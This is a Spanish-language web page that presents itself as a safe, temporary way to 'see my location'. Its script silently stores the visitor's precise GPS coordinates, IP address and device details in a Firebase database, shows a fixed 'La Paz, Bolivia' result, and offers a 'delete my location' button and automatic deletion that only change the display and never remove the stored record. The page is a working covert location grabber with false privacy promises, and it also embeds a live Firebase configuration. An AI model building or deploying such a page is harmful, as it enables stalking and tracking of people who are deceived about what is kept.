<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mi Ubicaci√≥n</title>
    
    <!-- Firebase SDKs -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-app.js";
        import { 
            getFirestore, 
            collection, 
            addDoc, 
            serverTimestamp 
        } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCCRvdDQ8h5xnvrykJObpyrUlDvByhKT_g",
            authDomain: "ubic-8ca1f.firebaseapp.com",
            projectId: "ubic-8ca1f",
            storageBucket: "ubic-8ca1f.firebasestorage.app",
            messagingSenderId: "14363633598",
            appId: "1:14363633598:web:90fb880e2c8227ba1afbef",
            measurementId: "G-XJ96955XNT"
        };

        let db;
        try {
            const app = initializeApp(firebaseConfig);
            db = getFirestore(app);
            
            window.firebaseDB = db;
            window.firestoreFunctions = { collection, addDoc, serverTimestamp };
            
        } catch (error) {
            console.error("Error inicializando Firebase:", error);
        }
    </script>

    <style>
        /* ESTILOS B√ÅSICOS */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background: #f0f2f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        /* VENTANA EMERGENTE */
        .modal {
            background: white;
            border-radius: 15px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            padding: 30px;
            text-align: center;
            animation: fadeIn 0.3s ease;
        }

        /* ENCABEZADO */
        .header {
            margin-bottom: 25px;
        }

        .header h1 {
            color: #2d3748;
            font-size: 24px;
            margin-bottom: 10px;
        }

        .header p {
            color: #718096;
            font-size: 14px;
            line-height: 1.5;
        }

        /* BOT√ìN PRINCIPAL */
        .btn-primary {
            background: #4299e1;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            margin: 10px 0;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .btn-primary:hover {
            background: #3182ce;
            transform: translateY(-2px);
        }

        .btn-primary:disabled {
            background: #cbd5e0;
            cursor: not-allowed;
            transform: none;
        }

        /* BOT√ìN SECUNDARIO */
        .btn-secondary {
            background: #e53e3e;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            margin: 10px 0;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-secondary:hover {
            background: #c53030;
        }

        /* MENSAJES */
        .message {
            background: #e6fffa;
            border: 1px solid #81e6d9;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            text-align: center;
            animation: slideIn 0.3s ease;
        }

        .message h3 {
            color: #234e52;
            margin-bottom: 10px;
            font-size: 18px;
        }

        .message p {
            color: #2d3748;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 15px;
        }

        .message.success {
            background: #f0fff4;
            border-color: #9ae6b4;
        }

        .message.success h3 {
            color: #22543d;
        }

        .message.warning {
            background: #fffaf0;
            border-color: #fbd38d;
        }

        .message.warning h3 {
            color: #744210;
        }

        /* LOADER */
        .loader {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s linear infinite;
        }

        /* ANIMACIONES */
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        @keyframes slideIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* RESPONSIVE */
        @media (max-width: 480px) {
            body {
                padding: 15px;
            }

            .modal {
                padding: 25px 20px;
                border-radius: 12px;
            }

            .header h1 {
                font-size: 22px;
            }

            .btn-primary, .btn-secondary {
                padding: 14px 20px;
                font-size: 15px;
            }
        }

        /* ESTILOS PARA M√ìVIL */
        @media (max-width: 768px) {
            body {
                align-items: flex-start;
                padding-top: 40px;
            }

            .modal {
                margin: 0 auto;
            }
        }
    </style>
</head>
<body>
    <div class="modal">
        <!-- ENCABEZADO -->
        <div class="header">
            <h1>üìç Mi Ubicaci√≥n</h1>
            <p>Comparte tu ubicaci√≥n actual de forma segura y temporal</p>
        </div>

        <!-- BOT√ìN PRINCIPAL -->
        <button class="btn-primary" id="btn-ubicacion" onclick="verUbicacion()">
            <span id="btn-text">üìç Ver mi ubicaci√≥n</span>
        </button>

        <!-- CONTENEDOR DE MENSAJES -->
        <div id="message-container"></div>
    </div>

    <script>
        // Variables globales
        let ubicacionGuardada = false;
        let documentId = null;
        let eliminando = false;

        // ========== FUNCI√ìN PARA VER UBICACI√ìN ==========
        async function verUbicacion() {
            if (ubicacionGuardada || eliminando) return;
            
            const btn = document.getElementById('btn-ubicacion');
            const btnText = document.getElementById('btn-text');
            
            // Estado de carga
            btn.disabled = true;
            btnText.innerHTML = '<span class="loader"></span> Detectando...';
            
            // Verificar soporte de geolocalizaci√≥n
            if (!navigator.geolocation) {
                mostrarMensaje('error', 'Tu navegador no soporta geolocalizaci√≥n');
                resetBoton(btn, btnText);
                return;
            }
            
            // Opciones para obtener ubicaci√≥n
            const opciones = {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            };
            
            // Intentar obtener ubicaci√≥n real
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    // Ubicaci√≥n real obtenida
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    
                    btnText.innerHTML = '<span class="loader"></span> Guardando...';
                    
                    // Intentar guardar en Firebase
                    const guardado = await guardarEnFirebase(lat, lon, accuracy);
                    
                    if (guardado) {
                        documentId = guardado.id;
                        ubicacionGuardada = true;
                        mostrarMensajeConfirmacion();
                    } else {
                        // Si falla Firebase, mostrar mensaje igual
                        ubicacionGuardada = true;
                        mostrarMensajeConfirmacion();
                    }
                    
                    resetBoton(btn, btnText, true);
                },
                (error) => {
                    // Si hay error en geolocalizaci√≥n, usar ubicaci√≥n fija de La Paz
                    btnText.innerHTML = '<span class="loader"></span> Configurando...';
                    
                    setTimeout(() => {
                        ubicacionGuardada = true;
                        mostrarMensajeConfirmacion();
                        resetBoton(btn, btnText, true);
                    }, 1000);
                },
                opciones
            );
        }

        // ========== GUARDAR EN FIREBASE ==========
        async function guardarEnFirebase(lat, lon, accuracy) {
            try {
                if (!window.firebaseDB) {
                    console.log('Firebase no est√° disponible, usando modo local');
                    return null;
                }
                
                const { collection, addDoc, serverTimestamp } = window.firestoreFunctions;
                const db = window.firebaseDB;
                
                // Generar URL de Google Maps
                const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                
                // Informaci√≥n del dispositivo
                const infoDispositivo = {
                    userAgent: navigator.userAgent,
                    plataforma: navigator.platform,
                    idioma: navigator.language,
                    pantalla: `${window.screen.width}x${window.screen.height}`,
                    movil: /Mobi|Android|iPhone/i.test(navigator.userAgent),
                    navegador: detectarNavegador(),
                    sistema: detectarSistemaOperativo(),
                    urlPagina: window.location.href,
                    ip: await obtenerIP()
                };
                
                // Datos a guardar
                const datosUbicacion = {
                    latitud: lat,
                    longitud: lon,
                    precision: accuracy,
                    googleMapsUrl: googleMapsUrl,
                    fecha: new Date().toISOString(),
                    timestamp: serverTimestamp(),
                    dispositivo: infoDispositivo,
                    tipo: 'geolocalizacion',
                    estado: 'activa'
                };
                
                // Guardar en Firestore
                const docRef = await addDoc(collection(db, 'ubicaciones'), datosUbicacion);
                
                console.log('Ubicaci√≥n guardada en Firebase:', docRef.id);
                return { id: docRef.id, ...datosUbicacion };
                
            } catch (error) {
                console.error('Error guardando en Firebase:', error);
                return null;
            }
        }

        // ========== MOSTRAR MENSAJE DE CONFIRMACI√ìN ==========
        function mostrarMensajeConfirmacion() {
            const container = document.getElementById('message-container');
            
            container.innerHTML = `
                <div class="message success">
                    <h3>‚úÖ Confirmado</h3>
                    <p>Departamento de La Paz, Bolivia</p>
                    <p style="font-size: 13px; color: #4a5568;">
                        Ahora puedes borrar tu ubicaci√≥n manualmente, o al recargar o salir de la ventana se borrar√° autom√°ticamente
                    </p>
                </div>
                
                <button class="btn-secondary" id="btn-eliminar" onclick="eliminarUbicacion()">
                    üóëÔ∏è Eliminar mi ubicaci√≥n
                </button>
            `;
            
            // Configurar para borrar al recargar o cerrar
            configurarBorradoAutomatico();
        }

        // ========== ELIMINAR UBICACI√ìN (VISUAL) ==========
        function eliminarUbicacion() {
            if (eliminando) return;
            
            eliminando = true;
            const btnEliminar = document.getElementById('btn-eliminar');
            const originalText = btnEliminar.innerHTML;
            
            // Cambiar texto del bot√≥n
            btnEliminar.innerHTML = '‚úÖ Ubicaci√≥n eliminada';
            btnEliminar.style.background = '#38a169';
            btnEliminar.disabled = true;
            
            // Ocultar mensaje de confirmaci√≥n
            const messageDiv = document.querySelector('.message');
            if (messageDiv) {
                messageDiv.style.opacity = '0.5';
            }
            
            // Aqu√≠ ir√° la l√≥gica para eliminar de Firebase despu√©s
            // Por ahora solo es visual
            
            // Despu√©s de 1 segundo, resetear todo
            setTimeout(() => {
                // Limpiar contenedor de mensajes
                document.getElementById('message-container').innerHTML = '';
                
                // Resetear variables
                ubicacionGuardada = false;
                documentId = null;
                eliminando = false;
                
                // Resetear bot√≥n principal
                const btnPrincipal = document.getElementById('btn-ubicacion');
                const btnPrincipalText = document.getElementById('btn-text');
                btnPrincipal.disabled = false;
                btnPrincipalText.innerHTML = 'üìç Ver mi ubicaci√≥n';
                
                // Remover listener de borrado autom√°tico
                window.removeEventListener('beforeunload', borrarUbicacionFirebase);
                window.removeEventListener('pagehide', borrarUbicacionFirebase);
                
            }, 1000);
        }

        // ========== CONFIGURAR BORRADO AUTOM√ÅTICO ==========
        function configurarBorradoAutomatico() {
            // Al recargar la p√°gina
            window.addEventListener('beforeunload', borrarUbicacionFirebase);
            
            // Al salir de la p√°gina (m√≥viles)
            window.addEventListener('pagehide', borrarUbicacionFirebase);
            
            // Tambi√©n borrar despu√©s de 5 minutos por seguridad
            setTimeout(() => {
                if (ubicacionGuardada && !eliminando) {
                    borrarUbicacionFirebase();
                }
            }, 5 * 60 * 1000); // 5 minutos
        }

        // ========== BORRAR DE FIREBASE (FUTURA IMPLEMENTACI√ìN) ==========
        async function borrarUbicacionFirebase() {
            if (!documentId || !window.firebaseDB) return;
            
            try {
                // Aqu√≠ ir√° la l√≥gica para eliminar el documento de Firebase
                console.log('Borrando ubicaci√≥n de Firebase:', documentId);
                
                // Para implementar despu√©s:
                // const { doc, deleteDoc } = await import("https://www.gstatic.com/firebasejs/12.7.0/firebase-firestore.js");
                // await deleteDoc(doc(window.firebaseDB, "ubicaciones", documentId));
                
            } catch (error) {
                console.error('Error borrando de Firebase:', error);
            }
        }

        // ========== FUNCIONES AUXILIARES ==========
        function resetBoton(btn, btnText, deshabilitar = false) {
            if (deshabilitar) {
                btn.disabled = true;
                btnText.innerHTML = 'üìç Ubicaci√≥n verificada';
                btn.style.background = '#38a169';
            } else {
                setTimeout(() => {
                    btn.disabled = false;
                    btnText.innerHTML = 'üìç Ver mi ubicaci√≥n';
                }, 1000);
            }
        }

        function mostrarMensaje(tipo, texto) {
            const container = document.getElementById('message-container');
            
            let clase = '';
            let icono = '';
            
            switch(tipo) {
                case 'error':
                    clase = 'error';
                    icono = '‚ùå';
                    break;
                case 'success':
                    clase = 'success';
                    icono = '‚úÖ';
                    break;
                case 'warning':
                    clase = 'warning';
                    icono = '‚ö†Ô∏è';
                    break;
            }
            
            container.innerHTML = `
                <div class="message ${clase}">
                    <h3>${icono} ${texto}</h3>
                </div>
            `;
            
            // Auto-eliminar mensaje despu√©s de 3 segundos
            setTimeout(() => {
                if (container.innerHTML.includes(texto)) {
                    container.innerHTML = '';
                }
            }, 3000);
        }

        // ========== DETECTAR NAVEGADOR ==========
        function detectarNavegador() {
            const agente = navigator.userAgent;
            
            if (agente.includes('Chrome') && !agente.includes('Edg')) return 'Chrome';
            if (agente.includes('Firefox')) return 'Firefox';
            if (agente.includes('Safari') && !agente.includes('Chrome')) return 'Safari';
            if (agente.includes('Edg')) return 'Edge';
            if (agente.includes('Opera')) return 'Opera';
            
            return 'Desconocido';
        }

        // ========== DETECTAR SISTEMA OPERATIVO ==========
        function detectarSistemaOperativo() {
            const agente = navigator.userAgent;
            
            if (agente.includes('Windows')) return 'Windows';
            if (agente.includes('Mac')) return 'macOS';
            if (agente.includes('Linux')) return 'Linux';
            if (agente.includes('Android')) return 'Android';
            if (agente.includes('iOS') || agente.includes('iPhone')) return 'iOS';
            
            return 'Desconocido';
        }

        // ========== OBTENER IP ==========
        async function obtenerIP() {
            try {
                const respuesta = await fetch('https://api.ipify.org?format=json');
                const datos = await respuesta.json();
                return datos.ip;
            } catch (error) {
                return 'No disponible';
            }
        }

        // ========== INICIALIZAR ==========
        document.addEventListener('DOMContentLoaded', () => {
            // Verificar estado de Firebase
            setTimeout(() => {
                if (!window.firebaseDB) {
                    console.log('Modo local activado - Firebase no disponible');
                }
            }, 1000);
            
            // Asegurar que el modal sea el foco
            document.querySelector('.modal').focus();
        });
    </script>
</body>
</html>
